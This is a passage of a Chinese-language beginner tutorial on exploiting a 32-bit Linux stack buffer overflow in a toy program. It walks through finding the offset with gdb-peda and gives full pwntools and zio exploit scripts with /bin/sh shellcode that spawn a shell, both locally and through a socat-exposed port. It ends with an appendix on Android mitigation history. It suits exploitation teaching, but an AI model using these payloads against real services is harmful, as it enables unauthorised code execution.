+-rw------- 1 wnagzihxain wnagzihxain 360448 4月   6 18:48 core.1491475716
+</code></pre><p>gdb打开core文件，查看一下首地址的数据还是很有必要的，可以跟蒸米一样，用<code>x/10s</code>查看字符串</p>
+<pre><code>wnagzihxain@toT0C:~$ gdb Demo core.1491475716 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;i686-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from Demo...(no debugging symbols found)...done.
+[New LWP 6173]
+Core was generated by `./Demo&#39;.
+Program terminated with signal SIGSEGV, Segmentation fault.
+#0  0xbfffeed0 in ?? ()
+gdb-peda$ x/x $sp-48
+0xbfffef20:    0x31
+gdb-peda$ x/16x $sp-48
+0xbfffef20:    0x31    0xc9    0xf7    0xe1    0x51    0x68    0x2f    0x2f
+0xbfffef28:    0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
+</code></pre><p>确认好地址是<code>0xbfffef20</code>，使用小端序写入Shellcode，直接运行，这下妥妥的</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+1���Qh//shh/bin���
+                  ����������������������� ���
+$ id
+uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ whoami
+wnagzihxain
+$
+</code></pre><p>至于第二种方法<code>gdb attach</code>，稍微麻烦点，attach上去之后再找到目标地址就行了</p>
+<pre><code>wnagzihxain@toT0C:~$ ps -ax | grep Demo
+ 5840 pts/19   T      0:00 gdb Demo
+ 6307 pts/19   S+     0:00 ./Demo
+ 6341 pts/20   S+     0:00 grep --color=auto Demo
+</code></pre><h2 id="0x04-">0x04 跟现实接轨</h2>
+<p>虽然这一篇是简单的入门，但是我们不能乱来啊，尼玛谁程序自带一段Shellcode啊，你搞攻击也要按照基本法啊！！！！！！</p>
+<p>还有谁的测试溢出点是靠目测的。。。。。。</p>
+<p>再次你也得搞个手动输入数据哇</p>
+<p>本来想接着用上面的代码的，但是考虑到有些细节蒸米师傅没写的我可以多写写，大家可以互相参考，所以这里使用蒸米的代码演示一波</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void Overflow()
+{
+    char buffer[128];
+    read(STDIN_FILENO, buffer, 256);
+}
+
+int main()
+{
+    Overflow();
+    write(STDOUT_FILENO, &quot;Hello,World\n&quot;, 13);
+    return 0;
+}
+</code></pre><p>测试溢出点，这里介绍个新方法，蒸米那里写的是<code>pattern.py</code>，这里可以使用peda的<code>pattern create</code>直接生成，长度随意，够大就行</p>
+<pre><code>gdb-peda$ pattern create 200
+&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;
+</code></pre><p>然后<code>r</code>，到输入的地方，把上面的数据拷贝进去</p>
+<p><img src="Image/17.png" alt=""></p>
+<p>注意最后一句，peda帮我们把异常的地方输出来了，这里就是返回地址的数据</p>
+<pre><code>[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41416d41 in ?? ()
+</code></pre><p>根据这个数据，我们找到需要覆盖长度</p>
+<pre><code>gdb-peda$ pattern offset 0x41416d41
+1094806849 found at offset: 140
+</code></pre><p>我们先来介绍一个Shellcode开发工具：pwntools</p>
+<p>安装</p>
+<pre><code>root@toT0C:/home/wnagzihxain# pip install pwn
+......
+&gt;&gt;&gt; import pwn
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)
+&#39;1\xc0&#39;
+&gt;&gt;&gt;
+</code></pre><p>写一个简单的溢出脚本，然后使用<code>core dump</code>数据找到真实的<code>buffer</code>起始地址，之所以不直接使用手动输入的方法找<code>buffer</code>起始地址是因为在我这测试，两种方法总会有偏差，以使用pwntools的Poc测试出来地址为准</p>
+<pre><code>#!/usr/bin/env python
+
+from pwn import *
+
+attack = process(&#39;./Demo&#39;)
+
+payload = &#39;\x90&#39; * 140 + &#39;AAAA&#39;
+
+attack.send(payload)
+
+attack.interactive()
+</code></pre><p>运行后生成<code>core dump</code>数据</p>
+<pre><code>gdb-peda$ x/50x $esp-144
+0xbfffef00:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef10:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef20:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef30:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef40:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef50:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef60:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef70:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffef80:    0x90909090    0x90909090    0x90909090    0x41414141
+0xbfffef90:    0xb7fbb3dc    0xbfffefb0    0x00000000    0xb7e21637
+0xbfffefa0:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
+0xbfffefb0:    0x00000001    0xbffff044    0xbffff04c    0x00000000
+0xbfffefc0:    0x00000000    0x00000000
+</code></pre><p><code>buffer</code>起始地址是<code>0xbfffef00</code>，一般开发Shellcode的时候，要避免这些<code>00</code>，会造成某些函数在操作Shellcode时发生截断</p>
+<p>所以我们这里把跳回的地址改为加4字节<code>0xbfffef04</code>，前面的四字节空白使用<code>\x90</code>填充</p>
+<p>来完成EXP的编写</p>
+<pre><code>#!/usr/bin/env python
+
+from pwn import *
+
+attack = process(&#39;./Demo&#39;)
+
+retn = 0xbfffef04
+
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+
+payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + p32(retn)
+
+attack.send(payload)
+
+attack.interactive()
+</code></pre><p>执行，返回一个Shell</p>
+<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[+] Starting local process &#39;./Demo&#39;: pid 2395
+[*] Switching to interactive mode
+$ id
+uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ whoami
+wnagzihxain
+$
+</code></pre><p>最后，为了模拟远程攻击，使用<code>socat</code>绑定本机端口</p>
+<p>安装<code>socat</code></p>
+<pre><code>root@toT0C:/home/wnagzihxain# sudo apt-get install socat
+</code></pre><p>新开Terminal，运行后放一边</p>
+<pre><code>wnagzihxain@toT0C:~$ socat TCP-LISTEN:23333,fork EXEC:./Demo
+</code></pre><p>修改崩溃测试脚本</p>
+<pre><code>#!/usr/bin/env python
+
+from pwn import *
+
+attack = remote(&#39;127.0.0.1&#39;, 23333)
+
+payload = &#39;\x90&#39; * 140 + &#39;AAAA&#39;
+
+attack.send(payload)
+
+attack.interactive()
+</code></pre><p>使用gdb调试该core文件，找到<code>buffer</code>起始地址是<code>0xbfffee50</code></p>
+<pre><code>gdb-peda$ x/50x $esp-144
+0xbfffee50:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffee60:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffee70:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffee80:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffee90:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffeea0:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffeeb0:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffeec0:    0x90909090    0x90909090    0x90909090    0x90909090
+0xbfffeed0:    0x90909090    0x90909090    0x90909090    0x41414141
+0xbfffeee0:    0xb7fbb3dc    0xbfffef00    0x00000000    0xb7e21637
+0xbfffeef0:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
+0xbfffef00:    0x00000001    0xbfffef94    0xbfffef9c    0x00000000
+0xbfffef10:    0x00000000    0x00000000
+</code></pre><p>修改EXP</p>
+<pre><code>#!/usr/bin/env python
+
+from pwn import *
+
+attack = remote(&#39;127.0.0.1&#39;, 23333)
+
+retn = 0xbfffee50
+
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+
+payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + p32(retn)
+
+attack.send(payload)
+
+attack.interactive()
+</code></pre><p>最终的远程攻击效果</p>
+<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[+] Opening connection to 127.0.0.1 on port 23333: Done
+[*] Switching to interactive mode
+$ id
+uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$
+</code></pre><p>蛮好蛮好，除了pwntools外，还有一个工具：zio</p>
+<pre><code>from zio import *
+
+attack = zio((&#39;127.0.0.1&#39;, 23333))
+
+retn = 0xbfffee50
+
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
+
+payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + l32(retn)
+
+attack.write(payload)
+
+attack.interact()
+</code></pre><p>效果</p>
+<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
+����1���Qh//shh/bin���
+                      �������������������������������������������������������������������������������������������������������������������P���
+id
+uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+</code></pre><p>个人比较喜欢pwntools</p>
+<h2 id="0x05-">0x05 小结</h2>
+<p>关了所有的保护机制还用了硬编码来写Shellcode，恥ずかしい思いをする</p>
+<h2 id="0x6-references">0x6 References</h2>
+<ul>
+<li>一步一步学ROP之linux_x86篇: <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.54.WniXFY&amp;articleid=403">https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.54.WniXFY&amp;articleid=403</a></li><li>现代栈溢出利用技术基础：ROP: <a href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></li><li>Linux (x86) Exploit Development Series: <a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/">https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/</a></li><li>Stack based buffer overflow ExploitationTutorial: <a href="https://www.exploit-db.com/docs/28475.pdf">https://www.exploit-db.com/docs/28475.pdf</a></li></ul>
+<h2 id="0x07-">0x07 附录</h2>
+<p>Android核心系统对缓解技术的支持历史，从上面提到的那本权威指南里抄出来的，<strong>手敲</strong>出来的</p>
+<ul>
+<li>1.5<ul>
+<li>在Bionic中禁用%n格式描述符</li><li>二进制文件编译时启用栈Cookie(-fstack-protector)</li><li>使用safe-iop库</li><li>使用加固的dlmalloc</li><li>实现calloc整数溢出检查</li><li>在内核中支持NX</li></ul>
+</li><li>2.3<ul>
+<li>二进制文件编译时启用不可执行的栈和堆机制</li><li>官方文档称加入了mmap_min_addr</li><li>二进制文件编译时使用-Wformat-security -Werror=format-security</li></ul>
+</li><li>4.0<ul>
+<li>随机化栈地址</li><li>随机化mmap(库文件，匿名映射)的地址</li></ul>
+</li><li>4.0.2<ul>
+<li>随机化堆地址</li></ul>
+</li><li>4.0.4<ul>
+<li>chown，chmod和mkdir改为使用NOFOLLOW标志</li></ul>
+</li><li>4.1<ul>
+<li>将umask默认值改为0077</li><li>限制READ_LOGS</li><li>随机化linker的段地址</li><li>二进制文件编译时使用RELRO和BIND_NOW</li><li>二进制文件编译时使用PIE</li><li>启用dmesg_restrict和kptr_restrict</li><li>引入隔离的Service</li></ul>
+</li><li>4.1.1<ul>
+<li>将mmap_min_addr的值增至32768</li></ul>
+</li><li>4.2<ul>
+<li>Content Provider默认不再暴露</li><li>为SecureRandom引入更多的种子使其无法预测</li><li>开始使用FORTIFY_SOURCE=1</li></ul>
+</li><li>4.2.2<ul>
+<li>默认启用ro.adb.secure</li></ul>
+</li><li>4.3<ul>
+<li>加入SELinux并启用permissive模式</li><li>移除所有使用了setuid和setgid的程序</li><li>阻止应用执行set-uid程序</li><li>实现在zygote和adbd中减少Linux能力</li></ul>
+</li><li>4.4<ul>
+<li>SELinux启用enforcing模式</li><li>开始使用FORTIFY_SOURCE=2</li></ul>
+</li></ul>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
